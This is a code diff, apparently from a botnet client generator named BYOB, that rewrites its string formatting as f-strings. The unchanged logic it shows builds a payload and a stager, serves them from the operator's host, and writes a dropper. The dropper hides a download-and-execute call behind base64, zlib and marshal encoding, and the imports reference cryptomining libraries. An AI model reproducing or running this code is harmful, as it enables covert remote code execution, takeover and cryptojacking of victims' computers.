@@ -195,8 +195,15 @@ def main():
     hidden  = _hidden (options, var=var, key=key, modules=modules, imports=imports)
     payload = _payload(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden)
     stager  = _stager (options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=payload)
-    dropper = _dropper(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=stager)
-    return dropper
+    return _dropper(
+        options,
+        var=var,
+        key=key,
+        modules=modules,
+        imports=imports,
+        hidden=hidden,
+        url=stager,
+    )
 
 def _update(input, output, task=None):
     diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
@@ -221,12 +228,18 @@ def _modules(options, **kwargs):
                     _m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
                     if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
                         util.display("[-]", color='red', style='normal')
-                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='normal')
+                        util.display(
+                            f"can't add module: '{m}' (does not exist)",
+                            color='reset',
+                            style='normal',
+                        )
                         continue
                 module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                 modules.append(module)
     __load__.set()
-    util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
+    util.display(
+        f"({len(modules)} modules added to client)", color='reset', style='dim'
+    )
     return modules
 
 def _imports(options, **kwargs):
@@ -247,7 +260,7 @@ def _imports(options, **kwargs):
         for line in open(module, 'r').read().splitlines():
             if len(line.split()):
                 if line.split()[0] == 'import':
-                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
+                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + [f'core.{s}' for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                         if x in line:
                             break
                     else:
@@ -277,7 +290,11 @@ def _hidden(options, **kwargs):
                 hidden.add(i)
 
     globals()['__load__'].set()
-    util.display("({} imports from {} modules)".format(len(list(hidden)), len(kwargs['modules'])), color='reset', style='dim')
+    util.display(
+        f"({len(list(hidden))} imports from {len(kwargs['modules'])} modules)",
+        color='reset',
+        style='dim',
+    )
     return list(hidden)
 
 def _payload(options, **kwargs):
@@ -290,7 +307,13 @@ def _payload(options, **kwargs):
 
 #    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
     loader  = open('core/loader.py','r').read()
-    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight','pyrx']])
+    test_imports = '\n'.join(
+        [
+            f'import {i}'
+            for i in list(kwargs['hidden'])
+            if i not in ['StringIO', '_winreg', 'pycryptonight', 'pyrx']
+        ]
+    )
     potential_imports = '''
 try:
     import pycryptonight
@@ -344,13 +367,13 @@ except ImportError: pass
 
         with open(path, 'w') as fp:
             fp.write(payload)
-         
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+
+        s = f"http://{options.host}:{int(options.port) + 1}/{pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), ''))}"
         s = urlparse.urlsplit(s)
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
-    util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
+    util.display(f"(hosting payload at: {url})", color='reset', style='dim')
     return url
 
 def _stager(options, **kwargs):
@@ -400,12 +423,12 @@ def _stager(options, **kwargs):
         with open(path, 'w') as fp:
             fp.write(stager)
 
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = f"http://{options.host}:{int(options.port) + 1}/{pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), ''))}"
         s = urlparse.urlsplit(s)
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
-    util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
+    util.display(f"(hosting stager at: {url})", color='reset', style='dim')
     return url
 
 def _dropper(options, **kwargs):
@@ -417,14 +440,22 @@ def _dropper(options, **kwargs):
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'hidden' in kwargs, "missing keyword argument 'hidden'"
 
-    name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
+    name = f"byob_{kwargs['var']}.py" if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
     dropper = """import sys,zlib,base64,marshal,json,urllib
 if sys.version_info[0] > 2:
     from urllib import request
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
-exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(repr(kwargs['url'])),2)))))
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(
+        repr(
+            base64.b64encode(
+                zlib.compress(
+                    marshal.dumps(f"urlopen({repr(kwargs['url'])}).read()", 2)
+                )
+            )
+        )
+    )
     with open(name, 'w') as fp:
         fp.write(dropper)
     util.display('({:,} bytes written to {})'.format(len(dropper), name), style='dim', color='reset')
